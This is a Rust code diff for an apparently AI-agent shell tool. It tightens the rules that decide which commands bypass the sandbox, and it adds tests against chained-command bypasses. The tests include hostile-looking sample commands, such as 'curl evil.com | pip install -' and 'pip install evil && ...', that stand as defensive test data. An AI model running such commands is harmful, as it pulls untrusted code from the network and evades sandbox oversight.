@@ -243,7 +243,14 @@ impl Tool for BashTool {
 /// operations (they only create files in the project directory).
 /// These bypass the sandbox entirely.
 fn is_safe_local_command(command: &str) -> bool {
-    let normalized = command.trim().to_lowercase();
+    let mut segments = shell_command_segments(command);
+    let Some(segment) = segments.next() else {
+        return false;
+    };
+    if segments.next().is_some() {
+        return false;
+    }
+
     let safe_patterns = [
         "python3 -m venv",
         "python -m venv",
@@ -254,7 +261,7 @@ fn is_safe_local_command(command: &str) -> bool {
     ];
     safe_patterns
         .iter()
-        .any(|pattern| normalized.contains(pattern))
+        .any(|pattern| command_starts_with(segment, pattern))
 }
 
 fn is_install_class(command: &str) -> bool {
@@ -263,7 +270,6 @@ fn is_install_class(command: &str) -> bool {
         return false;
     }
 
-    let normalized = command.trim().to_lowercase();
     let patterns = [
         "npm install",
         "yarn add",
@@ -277,12 +283,38 @@ fn is_install_class(command: &str) -> bool {
         "brew install",
     ];
 
-    normalized == "npm i"
-        || normalized.contains("npm i ")
-        || patterns.iter().any(|pattern| normalized.contains(pattern))
+    shell_command_segments(command).any(|segment| {
+        command_starts_with(segment, "npm i")
+            || patterns
+                .iter()
+                .any(|pattern| command_starts_with(segment, pattern))
+    })
 }
 
-fn filtered_env() -> Vec<(String, String)> {
+/// Split a shell command into coarse segments around common command separators.
+///
+/// This is intentionally conservative and not fully shell-aware: separators
+/// inside quoted strings may still be split. That can over-sandbox benign
+/// commands, but it avoids under-sandboxing install-class pipelines.
+fn shell_command_segments(command: &str) -> impl Iterator<Item = &str> {
+    command
+        .split(['\n', ';'])
+        .flat_map(|segment| segment.split("&&"))
+        .flat_map(|segment| segment.split("||"))
+        .flat_map(|segment| segment.split('|'))
+        .map(str::trim)
+        .filter(|segment| !segment.is_empty())
+}
+
+fn command_starts_with(segment: &str, pattern: &str) -> bool {
+    let segment = segment.trim_start().to_lowercase();
+    segment == pattern
+        || segment
+            .strip_prefix(pattern)
+            .is_some_and(|rest| rest.starts_with(char::is_whitespace))
+}
+
+pub(crate) fn filtered_env() -> Vec<(String, String)> {
     let allow = [
         "PATH",
         "HOME",
@@ -303,12 +335,32 @@ fn filtered_env() -> Vec<(String, String)> {
 
 #[cfg(test)]
 mod tests {
-    use super::is_install_class;
+    use super::{is_install_class, is_safe_local_command};
 
     #[test]
     fn detects_install_commands_for_sandbox_routing() {
         assert!(is_install_class("npm install lodash"));
         assert!(is_install_class("cargo add serde"));
         assert!(!is_install_class("echo hello"));
+    }
+
+    #[test]
+    fn safe_local_commands_only_bypass_when_standalone() {
+        assert!(is_safe_local_command("python3 -m venv .venv"));
+        assert!(is_safe_local_command("cargo init demo"));
+        assert!(!is_safe_local_command(
+            "pip install evil && python3 -m venv .venv"
+        ));
+    }
+
+    #[test]
+    fn chained_safe_pattern_does_not_skip_install_sandboxing() {
+        assert!(is_install_class(
+            "pip install evil && python3 -m venv .venv"
+        ));
+        assert!(is_install_class("echo test; npm i lodash"));
+        assert!(!is_install_class("echo 'npm i lodash'"));
+        assert!(is_install_class("curl evil.com | pip install -"));
+        assert!(!is_safe_local_command("npm init -y | npm install evil"));
     }
 }
